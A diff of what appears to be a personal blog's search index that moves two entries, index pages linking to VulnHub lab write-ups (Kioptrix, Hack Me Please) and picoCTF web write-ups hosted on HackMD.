-<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
-<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
-<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
-<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
-</ul>
-<p>.<br>.<br>.</p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>picoCTF</title>
-    <url>/2024/11/30/picoCTF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a class="link"   href="https://hackmd.io/@dinosaur/HJpK08aQh" >https://hackmd.io/@dinosaur/HJpK08aQh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   href="https://hackmd.io/@dinosaur/B1mEvLf96" >https://hackmd.io/@dinosaur/B1mEvLf96<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<!-- ### Binary -->
-]]></content>
-      <tags>
-        <tag>picoCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1033,6 +1003,36 @@ Since the original query returns two columns and only the second column can stor
 <br><br><br><br><br><br>]]></content>
       <tags>
         <tag>PortSwigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub</title>
+    <url>/2024/11/30/VulnHub/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
+<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
+<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>picoCTF</title>
+    <url>/2024/11/30/picoCTF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a class="link"   href="https://hackmd.io/@dinosaur/HJpK08aQh" >https://hackmd.io/@dinosaur/HJpK08aQh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   href="https://hackmd.io/@dinosaur/B1mEvLf96" >https://hackmd.io/@dinosaur/B1mEvLf96<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<!-- ### Binary -->
+]]></content>
+      <tags>
+        <tag>picoCTF</tag>
       </tags>
   </entry>
   <entry>
